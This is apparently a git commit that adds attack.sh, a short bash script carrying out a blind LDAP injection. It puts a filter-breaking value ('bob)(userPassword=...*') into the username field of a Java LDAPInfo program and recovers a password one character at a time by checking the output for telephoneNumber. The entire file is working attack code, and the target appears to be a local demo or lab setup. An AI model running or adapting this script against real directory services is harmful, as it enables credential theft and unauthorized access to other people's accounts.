5a6302feda532c59ac238419bd60fdd350223259
Raj Chowdhury <30806882+Rajchowdhury420@users.noreply.github.com>
2021-03-17 09:57:03 +0530

    Create attack.sh

---
+++ attack.sh
@@ -0,0 +1,29 @@
+#!/bin/bash
+
+# we just assume that it's that simple
+alphabet="qwertyuiopasdfghjklzxcvbnm"
+
+password=""
+found=1
+
+# stop when all guesses failed
+while [ ${found} -eq 1 ];
+do
+    found=0
+    while read -n1 character; do
+        username="bob)(userPassword=${password}${character}*"
+        /home/artem/jdk/jdk1.9.0b160/bin/java -cp classes LDAPInfo ${username} > log 2>&1
+        if grep telephoneNumber log > /dev/null 2>&1 ; then
+            # found next letter
+            password="${password}${character}"
+            found=1
+            echo "password should start with '${password}'"
+            break
+        fi
+    done < <(echo -n "${alphabet}")
+done
+
+echo "password: ${password}"
+
+# cleanup
+rm -rf log
